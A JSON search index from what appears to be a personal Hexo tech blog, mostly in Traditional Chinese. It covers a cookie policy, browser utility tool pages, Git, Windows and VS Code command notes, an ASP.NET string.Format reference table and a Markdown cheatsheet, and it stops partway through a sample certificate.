在您瀏覽時維護您的工作階段 安全 Cookie： 防範安全威脅 分析 Cookie 這些幫助我們了解訪客如何與我們的網站互動。 Google Analytics： 追蹤頁面瀏覽、使用者行為和網站效能 保留期限： 26 個月 功能性 Cookie 這些增強您的瀏覽體驗。 偏好設定 Cookie： 記住您的設定和偏好 語言 Cookie： 儲存您的語言偏好 行銷 Cookie 這些追蹤您的瀏覽習慣以顯示相關廣告。 第三方廣告 Cookie： 由廣告網路使用 社群媒體 Cookie： 啟用社群分享功能 第三方 Cookie 我們可能使用設定自己 Cookie 的第三方服務： Google Analytics 社群媒體平台（Twitter、Facebook、LinkedIn） 內容傳遞網路 您的 Cookie 選擇 瀏覽器設定 您可以透過瀏覽器設定控制 Cookie： Chrome： 設定 &gt; 隱私權和安全性 &gt; Cookie Firefox： 選項 &gt; 隱私權與安全性 &gt; Cookie Safari： 偏好設定 &gt; 隱私權 &gt; Cookie Edge： 設定 &gt; Cookie 和網站權限 選擇退出選項 要選擇退出非必要 Cookie，只需在您首次造訪我們網站時點擊 Cookie 橫幅中的「拒絕」或「拒絕」按鈕。如果未顯示橫幅，請清除您的 Cookie 並重新載入頁面以再次看到橫幅。 更新 Cookie 偏好設定： 點擊此處更新您的 Cookie 偏好設定 處理的法律依據 GDPR（歐盟） 必要 Cookie： 合法利益 分析 Cookie： 同意 行銷 Cookie： 同意 CCPA（加州） 您有權： 知道收集了哪些個人資訊 刪除個人資訊 選擇退出個人資訊的銷售 行使隱私權時不受歧視 國際合規性 本政策符合： EU GDPR（一般資料保護規範） UK GDPR 和 2018 年資料保護法 CCPA（加州消費者隱私法） PIPEDA（加拿大個人資訊保護） LGPD（巴西一般資料保護法） PDPA（新加坡個人資料保護法） 資料保留 工作階段 Cookie： 當您關閉瀏覽器時刪除 持久性 Cookie： 依類型而異（30 天至 2 年） 分析資料： 26 個月（Google Analytics 預設值） 您的權利 根據您的位置，您可能有權： 存取 您的個人資料 更正 不準確的資料 刪除 您的資料（「被遺忘權」） 限制 處理 資料可攜性 反對 處理 隨時 撤回同意 兒童隱私 我們的網站適用於 16 歲以下的兒童。在收集 13 歲以下兒童的資訊時，我們遵守適用的兒童隱私法，包括 COPPA。 Cookie 同意管理 當您首次造訪我們的網站時，您會看到一個 Cookie 橫幅，允許您： 接受所有 Cookie 拒絕非必要 Cookie 如果未顯示橫幅，請清除您的 Cookie 並重新載入頁面。 本政策的更新 我們可能會定期更新本 Cookie 政策。變更將發布在此頁面上，並更新「最後更新」日期。 聯絡資訊 有關本 Cookie 政策的問題或行使您的權利： 電子郵件： [插入您的電子郵件] 地址： [插入您的地址] 對於歐盟居民，您也可以透過 [插入 DPO 電子郵件] 聯絡我們的資料保護官。 監管機構 如果您在歐盟並對我們的資料實務有疑慮，您可以聯絡您當地的監管機構： 歐盟資料保護機構清單 本 Cookie 政策旨在符合國際隱私法。如需具體法律建議，請諮詢您所在司法管轄區的合格律師。","lang":"zh-TW"},{"title":"URL 解析器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-CN/tools/url-parser/index.html","permalink":"https://neo01.com/zh-CN/tools/url-parser/index.html","excerpt":"","text":"URL to parse:","lang":"zh-CN"},{"title":"立體四子棋","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-TW/games/connected_4_3d/index.html","permalink":"https://neo01.com/zh-TW/games/connected_4_3d/index.html","excerpt":"","text":"玩家 1 的回合 ← ↑ ↓ → 放下 重置 遊戲說明 使用方向鍵（左、右、上、下）移動抓手。 按空白鍵放下棋子。 將你的 4 個棋子連成一線（水平、垂直或對角線）即可獲勝！ 點擊「重置」開始新遊戲。 鏡頭控制 旋轉視角：按住滑鼠左鍵拖曳。 縮放：滾動滑鼠滾輪。 平移視角：按住滑鼠右鍵拖曳（或 Ctrl + 滑鼠左鍵）。","lang":"zh-TW"},{"title":"實用資訊","date":"un22fin22","updated":"un55fin55","comments":false,"path":"zh-TW/pages/useful-information/index.html","permalink":"https://neo01.com/zh-TW/pages/useful-information/index.html","excerpt":"","text":"關於 此頁面包含對我自己有用的資訊。它也作為此部落格的測試頁面。 常用提示 將字串從部落格標題轉換為 Linux 友善的檔案名稱。 convert string by replacing colon with dash, nonnalpha numeric with underscore. reduce repetiting underscore or dash to single underscore or dash: 軟體開發 安全性 Instrumentation tookit 執行命令時遮罩敏感資訊（如 Proxy-Authorization）， curl -v https://somewhere.need.authenticated.proxy 2&gt;&amp;1 | sed -E &quot;s/(proxy-authorization:).*/\\\\1: ***/i&quot; Nessus OWASP SANS Vulnerability Database 其他 Creating an Alpine Linux package Visual Studio Code Keyboard Shortcuts for Windows 常用命令 立即關閉 Windows shutdown -r -t 0，當你遠端連線到 Windows PC 時很有用 切換 Java 版本 export JAVA_HOME&#x3D;&#96;&#x2F;usr&#x2F;libexec&#x2F;java_home -v 1.8&#96; Git 復原（未推送） git reset --soft HEAD~ 刪除遠端分支 git push [remote] --delete [branch] 例如：git push origin --delete feature/branch 同步遠端分支並刪除遠端不存在的本地副本 git fetch --prune 列出分支之間的提交差異 git rev-list [branch]...[another branch] 列出分支之間的提交差異，箭頭指示哪個分支擁有該提交 git rev-list --left-right [branch]...[another branch] 列出分支相對於遠端分支的領先/落後提交 git rev-list [branch]...[remote]/[another branch] 顯示分支之間的領先或落後數量 git rev-list --left-right count [branch]...[another branch] 使用最新提交更新子模組 git submodule update --remote 清理孤立提交 git gc --prune=now --aggressive Windows 移除 XBox 使用 Powershell 移除 XBox Get-ProvisionedAppxPackage -Online | Where-Object &#123; $_.PackageName -match &quot;xbox&quot; &#125; | ForEach-Object &#123; Remove-ProvisionedAppxPackage -Online -AllUsers -PackageName $_.PackageName &#125; 檢查是否還有 Xbox 應用程式 dism /Online /Get-ProvisionedAppxPackages | Select-String PackageName | Select-String xbox Windows 快捷鍵 僅列出常用且容易忘記的快捷鍵。 將視窗移至另一個螢幕 ⊞ Windows + ⇧ Shift + ← / → 切換到另一個桌面 ⊞ Windows + ⌃ Control + ← / → 工作檢視 ⊞ Windows + Tab 開啟控制中心 ⊞ Windows + A 顯示/隱藏桌面 ⊞ Windows + D 開啟檔案總管 ⊞ Windows + E 快速連結選單（系統工具如事件檢視器） ⊞ Windows + X 鎖定 ⊞ Windows + L 編輯 切換語音輸入 ⊞ Windows + H 開啟剪貼簿歷史記錄 ⊞ Windows + ⌃ Control + V 貼上為純文字[1] ⊞ Windows + V[2] 擷取螢幕並 OCR 到剪貼簿[1:1] ⊞ Windows + T[2:1] 表情符號 ⊞ Windows + .[2:2] Visual Studio Code 快捷鍵 僅列出常用且容易忘記的快捷鍵。參考自 https://code.visualstudio.com/shortcuts/keyboard-shortcuts-windows.pdf 基本 使用者設定 ⌃ Control + , 選取所有符合的項目 Alt + Enter 快速修復 ⌃ Control&lt; + . Ctrl+K Ctrl+X ⌃ Control&lt; + K ⌃ Control&lt; + X 導覽 前往行… ⌃ Control + G 前往檔案… ⌃ Control + P 前往下一個錯誤或警告 F8 聚焦到第 1、2 或 3… 編輯器群組 ⌃ Control + 1/2/3… 分割編輯器 ⌃ Control + \\ 顯示整合終端機 ⌃ Control + ` 建立新終端機 ⌃ Control + ⇧ Shift + ` 顯示檔案總管 / 切換焦點 ⌃ Control + ⇧ Shift + E 顯示搜尋 ⌃ Control + ⇧ Shift + S 顯示原始檔控制 ⌃ Control + ⇧ Shift + G 顯示偵錯 ⌃ Control + ⇧ Shift + D 顯示擴充功能 ⌃ Control + ⇧ Shift + X 在檔案中取代 ⌃ Control + ⇧ Shift + H 顯示輸出面板 ⌃ Control + ⇧ Shift + U 在側邊開啟 Markdown 預覽 ⌃ Control + K V 偵錯 切換中斷點 F9 開始/繼續 F5 逐程序 F10 逐步執行 F11 跳離 ⇧ Shift + F11 其他 指南 學習 工具 需要 PowerToys ↩︎ ↩︎ 自訂快捷鍵 ↩︎ ↩︎ ↩︎","lang":"zh-TW"},{"title":"ASP.NET string.Format","date":"un55fin55","updated":"un66fin66","comments":true,"path":"zh-TW/pages/useful-information/aspnet-string-format.html","permalink":"https://neo01.com/zh-TW/pages/useful-information/aspnet-string-format.html","excerpt":"","text":"{0:d} YY-MM-DD {0:p} 百分比00.00% {0:N2} 12.68 {0:N0} 13 {0:c2} $12.68 {0:d} 3/23/2003 {0:T} 12:00:00 AM DataGrid-資料格式設定表達式 資料格式設定表達式 .NET Framework 格式設定表達式，它在資料顯示在欄中之前先套用於資料。此表達式由可選靜態文字和用以下格式表示的格式說明符組成： 零是參數索引，它指示欄中要格式化的資料元素；因此，通常用零來指示第一個（且唯一的）元素。format specifier 前面有一個冒號 (😃，它由一個或多個字母組成，指示如何格式化資料。可以使用的格式說明符取決於要格式化的資料類型：日期、數字或其他類型。下表顯示了不同資料類型的格式設定表達式的範例。有關格式設定表達式的更多資訊，請參見格式化類型。 Currency {0:C} numeric/decimal 顯示&quot;Price:&quot;，後跟以貨幣格式表示的數字。貨幣格式取決於透過 Page 指令或 Web.config 檔案中的區域性屬性指定的區域性設定。 Integer {0:D4} 整數()不能和小數一起使用。) 在由零填充的四個字元寬的欄位中顯示整數。 Numeric {0:N2}% 顯示精確到小數點後兩位的數字，後跟&quot;%&quot;。 Numeric/Decimal {0:000.0} 四捨五入到小數點後一位的數字。不到三位的數字用零填充。 Date/Datetime Long {0:D} 長日期格式（“Thursday, August 06, 1996”）。日期格式取決於頁或 Web.config 檔案的區域性設定。 Date/Datetime short {0:d} 短日期格式（“12/31/99”）。 Date/Datetime customize {0:yy-MM-dd} 用數字的年－月－日表示的日期（96-08-06）。 2006-02-22 | asp.net資料格式的Format-- DataFormatString 我們在呈現資料的時候，不要將未經修飾過的資料呈現給使用者。例如金額一萬元，如果我們直接顯示「10000」，可能會導致使用者看成一千或十萬，造成使用者閱讀資料上的困擾。若我們將一萬元潤飾後輸出為「NT$10,000」，不但讓使比較好閱讀，也會讓使用者減少犯錯的機會。\\n下列畫面為潤飾過的結果： 上述資料除了將DataGrid Web 控制項以顏色來區隔記錄外，最主要將日期、單價以及小計這三個計欄位的資料修飾的更容易閱讀。要修飾欄位的輸出，只要設定欄位的DataFormatString 屬性即可；其使用語法如下： DataFormatString=&quot;{0:格式字串}&quot; 我們知道在DataFormatString 中的 {0} 表示資料本身，而在冒號後面的格式字串代表所們希望資料顯示的格式；另外在指定的格式符號後可以指定小數所要顯示的位數。例如原來的資料為「12.34」，若格式設定為 {0:N1}，則輸出為「12.3」。其常用的數值格式如下表所示：\\n\\n格式字串 資料 結果 &quot;{0:C}&quot; 12345.6789 $12,345.68 &quot;{0:C}&quot; -12345.6789 ($12,345.68) &quot;{0:D}&quot; 12345 12345 &quot;{0:D8}&quot; 12345 00012345 &quot;{0:E}&quot; 12345.6789 1234568E+004 &quot;{0:E10}&quot; 12345.6789 1.2345678900E+004 &quot;{0:F}&quot; 12345.6789 12345.68 &quot;{0:F0}&quot; 12345.6789 12346 &quot;{0:G}&quot; 12345.6789 12345.6789 &quot;{0:G7}&quot; 123456789 1.234568E8 &quot;{0:N}&quot; 12345.6789 12,345.68 &quot;{0:N4}&quot; 123456789 123,456,789.0000 &quot;Total: {0:C}&quot; 12345.6789 Total: $12345.68 其常用的日期格式如下表所示： 格式 說明 輸出格式 d 精簡日期格式 MM/dd/yyyy D 詳細日期格式 dddd, MMMM dd, yyyy f 完整格式 (long date + short time) dddd, MMMM dd, yyyy HH:mm F 完整日期時間格式 (long date + long time) dddd, MMMM dd, yyyy HH:mm:ss g 一般格式 (short date + short time) MM/dd/yyyy HH:mm G 一般格式 (short date + long time) MM/dd/yyyy HH:mm:ss m,M 月日格式 MMMM dd\\ns 適中日期時間格式 yyyy-MM-dd HH:mm:ss t 精簡時間格式 HH:mm\\nT 詳細時間格式 HH:mm:ss string.format格式結果 String.Format © Currency: . . . . . . . . ($123.00) (D) Decimal:. . . . . . . . . -123 (E) Scientific: . . . . . . . -1.234500E+002 (F) Fixed point:. . . . . . . -123.45 (G) General:. . . . . . . . . -123 (N) Number: . . . . . . . . . -123.00 (P) Percent:. . . . . . . . . -12,345.00 % ® Round-trip: . . . . . . . -123.45 (X) Hexadecimal:. . . . . . . FFFFFF85 (d) Short date: . . . . . . . 6/26/2004 (D) Long date:. . . . . . . . Saturday, June 26, 2004 (t) Short time: . . . . . . . 8:11 PM (T) Long time:. . . . . . . . 8:11:04 PM (f) Full date/short time: . . Saturday, June 26, 2004 8:11 PM (F) Full date/long time:. . . Saturday, June 26, 2004 8:11:04 PM (g) General date/short time:. 6/26/2004 8:11 PM (G) General date/long time: . 6/26/2004 8:11:04 PM (M) Month:. . . . . . . . . . June 26 ® RFC1123:. . . . . . . . . Sat, 26 Jun 2004 20:11:04 GMT (s) Sortable: . . . . . . . . 2004-06-26T20:11:04 (u) Universal sortable: . . . 2004-06-26 20:11:04Z (invariant) (U) Universal sortable: . . . Sunday, June 27, 2004 3:11:04 AM (Y) Year: . . . . . . . . . . June, 2004 (G) General:. . . . . . . . . Green (F) Flags:. . . . . . . . . . Green (flags or integer) (D) Decimal number: . . . . . 3 (X) Hexadecimal:. . . . . . . 00000003 說明： String.Format 將指定的 String 中的每個格式項替換為相應物件的值的文字等效項。 例子： int iVisit = 100; string szName = &quot;Jackfled&quot;; Response.Write(String.Format(&quot;您的帳號是：{0} 。訪問了 {1} 次.&quot;, szName, iVisit));","lang":"zh-TW"},{"title":"世界时钟","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-CN/tools/world-clock/index.html","permalink":"https://neo01.com/zh-CN/tools/world-clock/index.html","excerpt":"","text":"+ Add Timezone Add Timezone 取消 Add","lang":"zh-CN"},{"title":"學習資源","date":"un22fin22","updated":"un66fin66","comments":false,"path":"zh-TW/pages/useful-information/learning.html","permalink":"https://neo01.com/zh-TW/pages/useful-information/learning.html","excerpt":"","text":"架構 Microsoft Azure 架構中心 程式設計 CodeSchool CodeFight HackerRank CodeCombat CodinGame 學習 Git 分支 使用互動式瀏覽器情境學習 Kubernetes 網路安全 (ISC)2 國際資訊系統安全認證聯盟 其他 高效能瀏覽器網路 聯合國氣候變遷學習","lang":"zh-TW"},{"title":"指南","date":"un22fin22","updated":"un66fin66","comments":false,"path":"zh-TW/pages/useful-information/guides.html","permalink":"https://neo01.com/zh-TW/pages/useful-information/guides.html","excerpt":"","text":"Mac [在 MacOS 上變更 Java 版本] http://www.guigarage.com/2013/02/change-java-version-on-mac-os/ 其他 ASP.NET string.Format（中文）","lang":"zh-TW"},{"title":"實用工具","date":"un22fin22","updated":"un66fin66","comments":false,"path":"zh-TW/pages/useful-information/useful_tools.html","permalink":"https://neo01.com/zh-TW/pages/useful-information/useful_tools.html","excerpt":"","text":"asciinema - 錄製 ASCII 並播放的工具。對簡報很有用。 網路安全 Snort (IDS)","lang":"zh-TW"},{"title":"Chmod 計算器","date":"un00fin00","updated":"un00fin00","comments":true,"path":"zh-TW/tools/chmod-calculator/index.html","permalink":"https://neo01.com/zh-TW/tools/chmod-calculator/index.html","excerpt":"","text":"File Permissions: Owner Group Others Read Write Execute 複製 Octal Notation 644 複製 Symbolic Notation rw-r--r-- 複製 Umask 022 Or enter octal value:","lang":"zh-TW"},{"title":"ASCII 文字繪製器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-TW/tools/ascii-text-drawer/index.html","permalink":"https://neo01.com/zh-TW/tools/ascii-text-drawer/index.html","excerpt":"","text":"要轉換的文字： 字體類別： Popular 3D & Effects Small & Compact Decorative Script & Cursive Tech & Digital Block & Solid Banner & Headers Monospace Themed & Special Geometric Retro & Vintage Stylized & Effects Artistic & Creative Money Fonts Named Fonts AMC Collection Efti Collection Miscellaneous All Fonts 複製 to Clipboard","lang":"zh-TW"},{"title":"計時器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-TW/tools/chronometer/index.html","permalink":"https://neo01.com/zh-TW/tools/chronometer/index.html","excerpt":"","text":"00:00:00.000 開始 暫停 停止 重置 計圈 Lap Times","lang":"zh-TW"},{"title":"Crontab 產生器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-TW/tools/crontab-generator/index.html","permalink":"https://neo01.com/zh-TW/tools/crontab-generator/index.html","excerpt":"","text":"Minute (0-59) Every minute 0 Every 5 minutes Every 10 minutes Every 15 minutes Every 30 minutes Hour (0-23) Every hour 0 (midnight) 6 AM 12 PM (noon) 6 PM Day (1-31) Every day 1st 15th Every 7 days Month (1-12) Every month January June December Weekday (0-7) Every day Sunday Monday Tuesday Wednesday Thursday Friday Saturday 複製 Cron Expression * * * * * Runs every minute","lang":"zh-TW"},{"title":"大小寫轉換器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-TW/tools/case-converter/index.html","permalink":"https://neo01.com/zh-TW/tools/case-converter/index.html","excerpt":"","text":"要轉換的文字： Hello World! This is a Sample Text.","lang":"zh-TW"},{"title":"Hexo 部落格速查表","date":"un44fin44","updated":"un55fin55","comments":false,"path":"zh-TW/pages/Hexo-Blogging-Cheatsheet/index.html","permalink":"https://neo01.com/zh-TW/pages/Hexo-Blogging-Cheatsheet/index.html","excerpt":"","text":"此頁面也用於測試文章和頁面中使用的元件。 實用連結 Hexo 文件 維基百科上的 XML 和 HTML 字元實體參考列表 我的部落格資訊 檢查我的網域是否在中國大陸被封鎖 設計 Font Awesome 常用表情符號 😄 :D(快捷鍵) 😄 :smile: 😊 :blush: 😍 :heart_eyes: 😓 :sweat: 👍 :thumbsup: 😋 :yum: 😰 :cold_sweat: 😱 :scream: 😭 :sob: 😜 :stuck_out_tongue_winking_eye: 😗 :kissing: 😪 :sleepy: 💩 :poop: ✌️ :v: 💯 :100: 🙈 :see_no_evil: 🙉 :hear_no_evil: 🙊 :speak_no_evil: 💋 :kiss: 💀 :skull: 💧 :droplet: 🎆 :fireworks: 📢 :loudspeaker: ⚠️ :warning: 🚫 :no_entry_sign: ✅ :white_check_mark: ❌ :x: ㊙️ :secret: ⁉️ :interrobang: ‼️ :bangbang: 更多請參考 Emoji Cheatsheet CSS 按鍵 Control &lt;kbd&gt;Contro&lt;/kbd&gt; Shift ⇧ &lt;kbd&gt;Shift &amp;#x21E7;&lt;/kbd&gt; - 使用 Unicode 字元 Markdown（含外掛） ++Inserted++ Inserted 註腳 [^1] 用於標記[1]，[^1]: 用於註解 如果 markdown 在 {{}} 或 {%%} 上造成問題，請使用 {% raw %}{% endraw %} Youtube 影片 {% youtube [youtube id] %} 動作 Markdown 範例 下標 H~2~0 H20 上標 x^2^ x2 粗體 **bold** bold 斜體 *italic* italic 粗體和斜體 ***bold and italic*** bold and italic 標記 ==marked== marked 刪除線 ~~strikethrough~~ strikethrough 行內程式碼 `inline code` inline code 連結 [link text](https://example.com) link text 圖片 ![alt text](https://example.com/image.jpg) 使用樣式類別的屬性，例如： # header &#123;.style-me&#125; paragraph &#123;data-toggle&#x3D;modal&#125; paragraph *style me*&#123;.red&#125; more text 輸出 &lt;h1 class&#x3D;&quot;style-me&quot;&gt;header&lt;&#x2F;h1&gt; &lt;p data-toggle&#x3D;&quot;modal&quot;&gt;paragraph&lt;&#x2F;p&gt; &lt;p&gt;paragraph &lt;em class&#x3D;&quot;red&quot;&gt;style me&lt;&#x2F;em&gt; more text&lt;&#x2F;p&gt; 表格欄位對齊 程式碼： | 預設 | 左對齊 | 置中 | 右對齊 | | --- | :-- | :-: | --: | | 1 | 1 | 1 | 1 | | 22 | 22 | 22 | 22 | | 333 | 333 | 333 | 333 | 結果： 預設 左對齊 置中 右對齊 1 1 1 1 22 22 22 22 333 333 333 333 引用區塊 程式碼： &gt; 一些引用文字 結果： 一些引用文字 有序清單 程式碼： 1. 項目 1 2. 項目 2 結果： 項目 1 項目 2 無序清單 程式碼： - 項目 1 - 項目 2 結果： 項目 1 項目 2 水平線 程式碼： --- 結果： 程式碼區塊 結果： 程式碼區塊 程式碼： ~~~ 程式碼區塊 ~~~ Github 卡片 使用者 程式碼： &#123;% githubCard user:neoalienson %&#125; neo.alienson @neoalienson 📍 Hong Kong 🔗 https://01man.com 📁 43 Repositories ⭐ 22 Stars 📈 34 Commits 👥 14 Followers 🔄 20 Pull Requests ❗ 0 Issues JavaScript 44.4% Swift 11.1% Dart 8.3% Python 8.3% TypeScript 8.3% Other 19.4% 儲存庫 程式碼： &#123;% githubCard user:neoalienson repo:pachinko %&#125; 結果： 📖 neoalienson/pachinko An iOS 'pinball' game using SpriteKit and Swift with physics engine ⭐ 7 Stars 🍴 1 Forks Language: C++ Mermaid JS 預先渲染。 程式碼： &#123;% mermaid %&#125; block-beta columns 1 db((&quot;DB&quot;)) blockArrowId6&lt;[&quot;&nbsp;&nbsp;&nbsp;&quot;]&gt;(down) block:ID A B[&quot;A wide one in the middle&quot;] C end space D ID --&gt; D C --&gt; D style B fill:#969,stroke:#333,stroke-width:4px &#123;% endmermaid %&#125; 結果： block-beta columns 1 db((\"DB\")) blockArrowId6(down) block:ID A B[\"A wide one in the middle\"] C end space D ID --> D C --> D style B fill:#969,stroke:#333,stroke-width:4px 即時渲染 block-beta columns 1 db((\"DB\")) blockArrowId6(down) block:ID A B[\"A wide one in the middle\"] C end space D ID --> D C --> D style B fill:#969,stroke:#333,stroke-width:4px 長條圖 結果： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_0ffa9e744')); var option = { \"title\": { \"text\": \"各作業系統的臨時埠範圍\" }, \"tooltip\": {}, \"xAxis\": { \"type\": \"category\", \"data\": [\"Linux (舊)\", \"Linux (新)\", \"Windows\", \"FreeBSD\", \"macOS\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"埠數量\" }, \"series\": [{ \"type\": \"bar\", \"data\": [28233, 28232, 16384, 55536, 16384], \"itemStyle\": { \"color\": \"#1976d2\" } }] }; chart.setOption(option); } })(); 程式碼： &#123;% echarts %&#125; &#123; &quot;title&quot;: &#123; &quot;text&quot;: &quot;各作業系統的臨時埠範圍&quot; &#125;, &quot;tooltip&quot;: &#123;&#125;, &quot;xAxis&quot;: &#123; &quot;type&quot;: &quot;category&quot;, &quot;data&quot;: [&quot;Linux (舊)&quot;, &quot;Linux (新)&quot;, &quot;Windows&quot;, &quot;FreeBSD&quot;, &quot;macOS&quot;] &#125;, &quot;yAxis&quot;: &#123; &quot;type&quot;: &quot;value&quot;, &quot;name&quot;: &quot;埠數量&quot; &#125;, &quot;series&quot;: [&#123; &quot;type&quot;: &quot;bar&quot;, &quot;data&quot;: [28233, 28232, 16384, 55536, 16384], &quot;itemStyle&quot;: &#123; &quot;color&quot;: &quot;#1976d2&quot; &#125; &#125;] &#125; &#123;% endecharts %&#125; 註腳範例 ↩︎","lang":"zh-TW"},{"title":"雜湊文字","date":"un00fin00","updated":"un00fin00","comments":true,"path":"zh-TW/tools/hash-text/index.html","permalink":"https://neo01.com/zh-TW/tools/hash-text/index.html","excerpt":"","text":"Text to hash: Hello World!","lang":"zh-TW"},{"title":"Base64 編碼器/解碼器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-TW/tools/base64-converter/index.html","permalink":"https://neo01.com/zh-TW/tools/base64-converter/index.html","excerpt":"","text":"URL Safe Input Text: 編碼 to Base64 解碼 from Base64 輸出： 複製","lang":"zh-TW"},{"title":"裝置資訊","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-TW/tools/device-information/index.html","permalink":"https://neo01.com/zh-TW/tools/device-information/index.html","excerpt":"","text":"","lang":"zh-TW"},{"title":"JSON 到 YAML 轉換器","date":"un00fin00","updated":"un00fin00","comments":true,"path":"zh-TW/tools/json-yaml-converter/index.html","permalink":"https://neo01.com/zh-TW/tools/json-yaml-converter/index.html","excerpt":"","text":"Pretty Format 輸入： JSON to YAML YAML to JSON 輸出： 複製","lang":"zh-TW"},{"title":"JSON 驗證器與格式化器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-TW/tools/json-validator/index.html","permalink":"https://neo01.com/zh-TW/tools/json-validator/index.html","excerpt":"","text":"Input JSON {\"name\":\"John\",\"age\":30,\"city\":\"New York\",\"hobbies\":[\"reading\",\"swimming\"]} 排序 Keys: Indent: 2 spaces 4 spaces Tab 格式化 壓縮 清除 Formatted Output 複製","lang":"zh-TW"},{"title":"NATO 字母轉換器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-TW/tools/nato-alphabet/index.html","permalink":"https://neo01.com/zh-TW/tools/nato-alphabet/index.html","excerpt":"","text":"Text to convert to NATO alphabet: Hello World","lang":"zh-TW"},{"title":"IPv4 子網路計算器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-TW/tools/ipv4-subnet-calculator/index.html","permalink":"https://neo01.com/zh-TW/tools/ipv4-subnet-calculator/index.html","excerpt":"","text":"IP Address with CIDR (e.g., 192.168.1.0/24): Class A (/8) Class B (/16) Class C (/24)","lang":"zh-TW"},{"title":"Mermaid 圖表編輯器","date":"un00fin00","updated":"un00fin00","comments":true,"path":"zh-TW/tools/mermaid-editor/index.html","permalink":"https://neo01.com/zh-TW/tools/mermaid-editor/index.html","excerpt":"","text":"Mermaid Code Flowchart Sequence Gantt Pie Chart Class Diagram graph TD A[Start] --> B{Is it?} B -->|Yes| C[OK] C --> D[Rethink] D --> B B ---->|No| E[End] Render 清除 複製 Code Diagram Output Zoom In Zoom Out 重置 Zoom 下載 SVG Enter Mermaid code above and click Render to see the diagram...","lang":"zh-TW"},{"title":"EXIF 提取器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-TW/tools/exif-extractor/index.html","permalink":"https://neo01.com/zh-TW/tools/exif-extractor/index.html","excerpt":"","text":"Upload or drag and drop a JPEG image to extract and analyze its EXIF metadata information. 📁 Click here or drag and drop a JPEG file","lang":"zh-TW"},{"title":"URL 編碼器/解碼器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-TW/tools/url-encoder/index.html","permalink":"https://neo01.com/zh-TW/tools/url-encoder/index.html","excerpt":"","text":"Text to encode/decode: Hello World! This is a test URL: https://example.com/path?param=value&other=test 編碼 解碼 複製 Result","lang":"zh-TW"},{"title":"表情符號選擇器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-TW/tools/emoji-picker/index.html","permalink":"https://neo01.com/zh-TW/tools/emoji-picker/index.html","excerpt":"","text":"Emoji copied!","lang":"zh-TW"},{"title":"SQL 美化器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-TW/tools/sql-prettify/index.html","permalink":"https://neo01.com/zh-TW/tools/sql-prettify/index.html","excerpt":"","text":"SQL to format: SELECT u.id, u.name, p.title FROM users u JOIN posts p ON u.id = p.user_id WHERE u.active = 1 AND p.published = 1 ORDER BY p.created_at DESC; Keyword Case: UPPER lower Preserve Indent Style: Standard Tabular Left Tabular Right 格式化 SQL 壓縮 SQL 複製 Formatted SQL","lang":"zh-TW"},{"title":"瀏覽器提示 API 遊樂場","date":"un66fin66","updated":"un66fin66","comments":true,"path":"zh-TW/ai/prompt/index.html","permalink":"https://neo01.com/zh-TW/ai/prompt/index.html","excerpt":"","text":"這是 Chrome 內建 提示 API 的示範，由 Gemini Nano 提供支援。 提示 法國的首都是什麼？ 提交提示 重置會話 Top-k 溫度 會話統計 溫度 Top-k 已使用代幣 剩餘代幣 總代幣數 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 對話 原始回應","lang":"zh-TW"},{"title":"溫度轉換器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-TW/tools/temperature-converter/index.html","permalink":"https://neo01.com/zh-TW/tools/temperature-converter/index.html","excerpt":"","text":"Temperature value:","lang":"zh-TW"},{"title":"URL 解析器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-TW/tools/url-parser/index.html","permalink":"https://neo01.com/zh-TW/tools/url-parser/index.html","excerpt":"","text":"URL to parse:","lang":"zh-TW"},{"title":"瀏覽器文字摘要器遊樂場","date":"un66fin66","updated":"un66fin66","comments":true,"path":"zh-TW/ai/summary/index.html","permalink":"https://neo01.com/zh-TW/ai/summary/index.html","excerpt":"","text":"提示 敏捷的棕色狐狸跳過懶狗。這是一個示範 Chrome 內建 AI 摘要功能的範例文字。文字可以更長、更複雜，包含多個段落、技術細節和各種需要濃縮成更短、更易消化格式的主題。 代幣使用量：0 設定 摘要類型： 重點 太長不看 預告 標題 長度： 短 中 長 格式： Markdown 純文字 摘要 在上方輸入文字以產生摘要... 此瀏覽器不支援摘要 API。請使用啟用 AI 功能的 Chrome Canary。 摘要 API 無法使用。請檢查您的瀏覽器設定。","lang":"zh-TW"},{"title":"文字統計","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-TW/tools/text-statistics/index.html","permalink":"https://neo01.com/zh-TW/tools/text-statistics/index.html","excerpt":"","text":"Text to analyze: Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.","lang":"zh-TW"},{"title":"X.509 憑證解碼器","date":"un00fin00","updated":"un00fin00","comments":true,"path":"zh-TW/tools/x509-decoder/index.html","permalink":"https://neo01.com/zh-TW/tools/x509-decoder/index.html","excerpt":"","text":"X.509 憑證（PEM 格式）： 解碼 Certificate 清除 複製 All 文字格式 複製 Sample 測試用範例憑證 -----BEGIN CERTIFICATE----- MIIE/TCCA+WgAwIBAgISBnY9ugTPoh5t2QcBI3lLRT7NMA0GCSqGSIb3DQEBCwUA MDMxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBFbmNyeXB0MQwwCgYDVQQD EwNSMTEwHhcNMjUwODE5MjExOTM4WhcNMjUxMTE3MjExOTM3WjAUMRIwEAYDVQQD EwluZW8wMS5jb20wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCYmFjr 